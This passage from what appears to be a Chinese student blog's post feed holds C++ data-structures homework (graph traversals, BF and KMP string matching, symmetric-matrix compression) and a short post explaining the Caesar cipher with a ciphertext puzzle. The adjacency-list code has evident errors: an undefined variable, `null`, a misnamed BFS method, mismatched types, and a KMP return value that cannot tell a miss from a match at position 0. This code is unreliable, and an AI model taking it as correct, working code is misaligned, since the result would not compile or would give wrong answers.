class="keyword">class</span> <span class="title class_">DataType</span>&gt;</span><br><span class="line"><span class="type">void</span> MGraph&lt;DataType&gt;::<span class="built_in">DFTraverse</span>(<span class="type">int</span> v) &#123;</span><br><span class="line">    cout &lt;&lt; vertex[v]; visited[v] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; vertexNum; j++)</span><br><span class="line">        <span class="keyword">if</span> (edge[v][j] == <span class="number">1</span> &amp;&amp; visited[j] == <span class="number">0</span>) <span class="built_in">DFTraverse</span>(j);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">DataType</span>&gt;</span><br><span class="line"><span class="type">void</span> MGraph&lt;DataType&gt;::<span class="built_in">BFTraverse</span>(<span class="type">int</span> v) &#123;</span><br><span class="line">    <span class="type">int</span> w, j, Q[MaxSize];</span><br><span class="line">    <span class="type">int</span> front = <span class="number">-1</span>, rear = <span class="number">-1</span>;</span><br><span class="line">    cout &lt;&lt; vertex[v]; visited[v] = <span class="number">1</span>; Q[++rear] = v;</span><br><span class="line">    <span class="keyword">while</span> (front != rear) &#123;</span><br><span class="line">        w = Q[++front];</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; vertexNum; j++)</span><br><span class="line">            <span class="keyword">if</span> (edge[w][j] == <span class="number">1</span> &amp;&amp; visited[j] == <span class="number">0</span>) &#123;</span><br><span class="line">                cout &lt;&lt; vertex[j]; visited[j] = <span class="number">1</span>; Q[++rear] = j;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    string ch[] = &#123; <span class="string">&quot;V1&quot;</span>,<span class="string">&quot;V2&quot;</span>,<span class="string">&quot;V3&quot;</span>,<span class="string">&quot;V4&quot;</span>,<span class="string">&quot;V5&quot;</span> &#125;;</span><br><span class="line">    MGraph&lt;string&gt; MG&#123; ch, <span class="number">5</span>, <span class="number">6</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MaxSize; i++)</span><br><span class="line">        visited[i] = <span class="number">0</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;\n深度优先遍历序列是：&quot;</span> &lt;&lt; endl;</span><br><span class="line">    MG.<span class="built_in">DFTraverse</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MaxSize; i++)</span><br><span class="line">        visited[i] = <span class="number">0</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;\n广度优先遍历序列是：&quot;</span> &lt;&lt; endl;</span><br><span class="line">    MG.<span class="built_in">BFTraverse</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h1 id="邻接表"><a href="#邻接表" class="headerlink" title="邻接表"></a>邻接表</h1><div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">EdgeNode</span>		<span class="comment">//定义边表结点</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> adjvex;	<span class="comment">//邻接点域</span></span><br><span class="line">	EdgeNode* next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">DataType</span>&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">VertexNode</span>		<span class="comment">//定义顶点表结点</span></span><br><span class="line">&#123;</span><br><span class="line">	DataType vertex;</span><br><span class="line">	EdgeNode* firstEdge;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MaxSize = <span class="number">10</span>;		<span class="comment">//图的最多顶点数</span></span><br><span class="line"><span class="type">int</span> visited[MaxSize] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">DataType</span>&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ALGraph</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">ALGraph</span>(DataType a[], <span class="type">int</span> n, <span class="type">int</span> e);			<span class="comment">//构造函数</span></span><br><span class="line">	~<span class="built_in">ALGraph</span>();									<span class="comment">//析构函数</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">DFTraverse</span><span class="params">(<span class="type">int</span> v)</span></span>;					<span class="comment">//深度</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">BEFraverse</span><span class="params">(<span class="type">int</span> v)</span></span>;					<span class="comment">//广度</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	VertexNode&lt;DataType&gt; adjlist[MaxSize];	<span class="comment">//存放顶点表</span></span><br><span class="line">	<span class="type">int</span> vertexNum, edgeNum;					<span class="comment">//图的顶点数和边数</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">DataType</span>&gt;</span><br><span class="line">ALGraph&lt;DataType&gt;::<span class="built_in">ALGraph</span>(DataType a[], <span class="type">int</span> n, <span class="type">int</span> e)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> i, j, k;</span><br><span class="line">	EdgeNode* s = <span class="literal">nullptr</span>;</span><br><span class="line">	vertexNum = m;</span><br><span class="line">	edgeNum = e;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; vertexNum; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		adjlist[i].vertex = a[i];</span><br><span class="line">		adjlist[i].firstEdge = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; edgeNum; k++)	<span class="comment">//依次输入每一条边</span></span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;输入边所依付的两个顶点的编号：&quot;</span>;</span><br><span class="line">		cin &gt;&gt; i &gt;&gt; j;</span><br><span class="line">		s = <span class="keyword">new</span> EdgeNode;</span><br><span class="line">		s-&gt;adjvex = j;</span><br><span class="line">		s-&gt;next = adjlist[i].firstEdge;</span><br><span class="line">		adjlist[i].firstEdge = s;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">DataType</span>&gt;</span><br><span class="line">ALGraph&lt;DataType&gt;::~<span class="built_in">ALGraph</span>()</span><br><span class="line">&#123;</span><br><span class="line">	EdgeNode* p = <span class="literal">NULL</span>, * q = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; vertexNum; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		p = q = adjlist[i].firstEdge;</span><br><span class="line">		<span class="keyword">while</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			p = p-&gt;next;</span><br><span class="line">			<span class="keyword">delete</span> q;</span><br><span class="line">			q = p;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">DataType</span>&gt;</span><br><span class="line"><span class="type">void</span> ALGraph&lt;DataType&gt;::<span class="built_in">DFTraverse</span>(<span class="type">int</span> v)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> j;</span><br><span class="line">	EdgeNode* p = null;</span><br><span class="line">	cout &lt;&lt; adjlist[v].vertex;</span><br><span class="line">	visited[v] = <span class="number">1</span>;</span><br><span class="line">	p = adjlist[v].firstEdge;</span><br><span class="line">	<span class="keyword">while</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		j = p-&gt;adjvex;</span><br><span class="line">		<span class="keyword">if</span> (visited[j]==<span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">DFTraverse</span>(j);</span><br><span class="line">		&#125;</span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//测试数据是图6-20(a)，边是(0 1)(0 3)(0 4)(1 2)(2 4)(3 2)(3 4)</span></span><br><span class="line">	string ch[] = &#123; <span class="string">&#x27;V1&#x27;</span>,<span class="string">&#x27;V2&#x27;</span>,<span class="string">&#x27;V3&#x27;</span>,<span class="string">&#x27;V4&#x27;</span>,<span class="string">&#x27;V5&#x27;</span> &#125;;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="function">ALGraph&lt;<span class="type">char</span>&gt; <span class="title">ALG</span><span class="params">(ch, <span class="number">5</span>, <span class="number">7</span>)</span></span>;               <span class="comment">//建立具有5个顶点6条边的有向图</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MaxSize; i++)</span><br><span class="line">		visited[i] = <span class="number">0</span>;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;深度优先遍历序列是：&quot;</span>;</span><br><span class="line">	ALG.<span class="built_in">DFTraverse</span>(<span class="number">0</span>);                       <span class="comment">//从顶点0出发进行深度优先遍历</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MaxSize; i++)</span><br><span class="line">		visited[i] = <span class="number">0</span>;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;广度优先遍历序列是：&quot;</span>;</span><br><span class="line">	ALG.<span class="built_in">BFTraverse</span>(<span class="number">0</span>);                      <span class="comment">//从顶点0出发进行广度优先遍历</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>学习笔记</category>
        <category>数据结构作业</category>
        <category>实验</category>
      </categories>
      <tags>
        <tag>数据结构作业</tag>
      </tags>
  </entry>
  <entry>
    <title>实验四：字符串和多维数组的实现与应用</title>
    <url>/posts/6352a281.html</url>
    <content><![CDATA[<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cyberdownload.anrunlu.net/FicVRmge8QVfGJ00XaVJaDVKtKiH"
                     
                ></p>
<h1 id="BF-KMP算法"><a href="#BF-KMP算法" class="headerlink" title="BF+KMP算法"></a>BF+KMP算法</h1><div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MaxLen 1000</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">SeqString</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> ch[MaxSize];</span><br><span class="line">	<span class="type">int</span> len;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// BF算法</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">BF</span><span class="params">(<span class="type">char</span> S[], <span class="type">char</span> T[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, start = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (S[i] != <span class="string">&#x27;\0&#x27;</span> &amp;&amp; T[j] != <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (S[i] == T[j])</span><br><span class="line">		&#123;</span><br><span class="line">			i++;</span><br><span class="line">			j++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			start++;</span><br><span class="line">			i = start;</span><br><span class="line">			j = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (T[j] == <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> start + <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">GetNext</span><span class="params">(SeqString t, <span class="type">int</span> next[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> j, k;</span><br><span class="line">	j = <span class="number">0</span>;</span><br><span class="line">	k = <span class="number">-1</span>;</span><br><span class="line">	next[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">while</span> (j &lt; t.len - <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (k == <span class="number">-1</span> || t.ch[j] == t.ch[k])</span><br><span class="line">		&#123;</span><br><span class="line">			j++;</span><br><span class="line">			k++;</span><br><span class="line">			next[j] = k;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			k = next[k];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">KMP</span><span class="params">(SeqString s, SeqString t)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> next[MaxLen], i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">GetNext</span>(t, next); <span class="comment">// 求next值</span></span><br><span class="line">	<span class="keyword">while</span> (i &lt; s.len &amp;&amp; j &lt; t.len) <span class="comment">// 修改这里</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (j == <span class="number">-1</span> || s.ch[i] == t.ch[j])</span><br><span class="line">		&#123;</span><br><span class="line">			i++;</span><br><span class="line">			j++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			j = next[j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (j &gt;= t.len)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> (i - t.len); <span class="comment">// 返回下标</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 不匹配</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;*******BF算法实验*******&quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="type">char</span> a[MaxLen], b[MaxLen];</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入主串&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cin &gt;&gt; a;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;输入了&quot;</span> &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入子串&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cin &gt;&gt; b;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;输入了&quot;</span> &lt;&lt; b &lt;&lt; endl;</span><br><span class="line">	<span class="type">int</span> bf = <span class="built_in">BF</span>(a, b);</span><br><span class="line">	<span class="keyword">if</span> (bf == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;BF算法结果：未找到&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;BF算法结果：位置是：&quot;</span> &lt;&lt; bf &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;*******BF算法实验*******&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;*******KMP算法实验*******&quot;</span> &lt;&lt; endl;</span><br><span class="line">	SeqString s, t;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入主串&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cin &gt;&gt; s.ch;</span><br><span class="line">	s.len = <span class="built_in">strlen</span>(s.ch);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;输入了&quot;</span> &lt;&lt; s.ch &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;长度是：&quot;</span> &lt;&lt; s.len &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入子串&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cin &gt;&gt; t.ch;</span><br><span class="line">	t.len = <span class="built_in">strlen</span>(t.ch);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;输入了&quot;</span> &lt;&lt; t.ch &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;长度是：&quot;</span> &lt;&lt; t.len &lt;&lt; endl;</span><br><span class="line">	<span class="type">int</span> kmp = <span class="built_in">KMP</span>(s, t);</span><br><span class="line">	<span class="keyword">if</span> (kmp == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;KMP算法结果：未找到&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;KMP算法结果：位置是：&quot;</span> &lt;&lt; kmp + <span class="number">1</span> &lt;&lt; endl; <span class="comment">// 返回的下标从1开始计数，所以需要+1</span></span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;*******KMP算法实验*******&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 确保main函数有返回值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h1 id="对称矩阵的压缩"><a href="#对称矩阵的压缩" class="headerlink" title="对称矩阵的压缩"></a>对称矩阵的压缩</h1><div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 1000</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">yuansu</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="type">int</span> j;</span><br><span class="line">	<span class="type">int</span> data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Matrix</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Matrix</span>();</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">PrintMatrix</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">getMatrix</span><span class="params">(yuansu s)</span></span>;</span><br><span class="line">	~<span class="built_in">Matrix</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">int</span> ma[MaxSize];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Matrix::<span class="built_in">Matrix</span>()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MaxSize; i++)</span><br><span class="line">		ma[i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Matrix::~<span class="built_in">Matrix</span>()</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Matrix::getMatrix</span><span class="params">(yuansu s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (s.i &gt;= s.j) &#123;</span><br><span class="line">		<span class="type">int</span> k = s.i * (s.i - <span class="number">1</span>) / <span class="number">2</span> + s.j - <span class="number">1</span>;</span><br><span class="line">		ma[k] = s.data;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Matrix::PrintMatrix</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MaxSize; i++)</span><br><span class="line">		<span class="keyword">if</span> (ma[i] != <span class="number">0</span>)</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;ma[&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;] = &quot;</span> &lt;&lt; ma[i] &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Matrix ws;</span><br><span class="line">	yuansu s;</span><br><span class="line">	cin &gt;&gt; s.i &gt;&gt; s.j &gt;&gt; s.data;</span><br><span class="line">	ws.<span class="built_in">getMatrix</span>(s);</span><br><span class="line">	ws.<span class="built_in">PrintMatrix</span>();</span><br><span class="line">	cin &gt;&gt; s.i &gt;&gt; s.j &gt;&gt; s.data;</span><br><span class="line">	ws.<span class="built_in">getMatrix</span>(s);</span><br><span class="line">	ws.<span class="built_in">PrintMatrix</span>();</span><br><span class="line">	cin &gt;&gt; s.i &gt;&gt; s.j &gt;&gt; s.data;</span><br><span class="line">	ws.<span class="built_in">getMatrix</span>(s);</span><br><span class="line">	ws.<span class="built_in">PrintMatrix</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>学习笔记</category>
        <category>数据结构作业</category>
        <category>实验</category>
      </categories>
      <tags>
        <tag>数据结构作业</tag>
      </tags>
  </entry>
  <entry>
    <title>密码学——凯撒密码原理</title>
    <url>/posts/dcad2738.html</url>
    <content><![CDATA[<h1 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h1><blockquote>
<p>来自千千秀字</p>
</blockquote>
<p>凯撒密码最早由古罗马军事统帅盖乌斯·尤利乌斯·凯撒在军队中用来传递加密信息，故称凯撒密码。这是一种位移加密方式，只对26个字母进行位移替换加密，规则简单，容易破解。下面是位移1次的对比：</p>
<table>
<thead>
<tr>
<th>明文字母表</th>
<th>Z</th>
<th>A</th>
<th>B</th>
<th>C</th>
<th>D</th>
<th>E</th>
<th>F</th>
<th>G</th>
<th>H</th>
<th>I</th>
<th>J</th>
<th>K</th>
<th>L</th>
<th>M</th>
<th>N</th>
<th>O</th>
<th>P</th>
<th>Q</th>
<th>R</th>
<th>S</th>
<th>T</th>
<th>U</th>
<th>V</th>
<th>W</th>
<th>X</th>
<th>Y</th>
</tr>
</thead>
<tbody><tr>
<td>密文字母表</td>
<td>A</td>
<td>B</td>
<td>C</td>
<td>D</td>
<td>E</td>
<td>F</td>
<td>G</td>
<td>H</td>
<td>I</td>
<td>J</td>
<td>K</td>
<td>L</td>
<td>M</td>
<td>N</td>
<td>O</td>
<td>P</td>
<td>Q</td>
<td>R</td>
<td>S</td>
<td>T</td>
<td>U</td>
<td>V</td>
<td>W</td>
<td>X</td>
<td>Y</td>
<td>Z</td>
</tr>
</tbody></table>
<p>将明文字母表向后移动1位，A变成了B，B变成了C……，Z变成了A。同理，若将明文字母表向后移动3位：</p>
<table>
<thead>
<tr>
<th>明文字母表</th>
<th>X</th>
<th>Y</th>
<th>Z</th>
<th>A</th>
<th>B</th>
<th>C</th>
<th>D</th>
<th>E</th>
<th>F</th>
<th>G</th>
<th>H</th>
<th>I</th>
<th>J</th>
<th>K</th>
<th>L</th>
<th>M</th>
<th>N</th>
<th>O</th>
<th>P</th>
<th>Q</th>
<th>R</th>
<th>S</th>
<th>T</th>
<th>U</th>
<th>V</th>
<th>W</th>
</tr>
</thead>
<tbody><tr>
<td>密文字母表</td>
<td>A</td>
<td>B</td>
<td>C</td>
<td>D</td>
<td>E</td>
<td>F</td>
<td>G</td>
<td>H</td>
<td>I</td>
<td>J</td>
<td>K</td>
<td>L</td>
<td>M</td>
<td>N</td>
<td>O</td>
<td>P</td>
<td>Q</td>
<td>R</td>
<td>S</td>
<td>T</td>
<td>U</td>
<td>V</td>
<td>W</td>
<td>X</td>
<td>Y</td>
<td>Z</td>
</tr>
</tbody></table>
<p>则A变成了D，B变成了E……，Z变成了C。</p>
<p>字母表最多可以移动25位。凯撒密码的明文字母表向后或向前移动都是可以的，通常表述为向后移动，如果要向前移动1位，则等同于向后移动25位，位移选择为25即可。</p>
<h1 id="尝试一下"><a href="#尝试一下" class="headerlink" title="尝试一下"></a>尝试一下</h1><p>现在你已经知道原理了，解密一下下面这个吧</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">oknqdbqmoq&#123;kag_tmhq_xqmdzqp_omqemd_qzodkbfuaz&#125;</span><br></pre></td></tr></table></figure></div>

<p>.</p>
<p>.</p>
<h1 id="在线解密地址"><a href="#在线解密地址" class="headerlink" title="在线解密地址"></a>在线解密地址</h1><p><a class="link"   href="https://www.qqxiuzi.cn/bianma/kaisamima.php" >凯撒密码在线加密解密 - 千千秀字 (qqxiuzi.cn)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
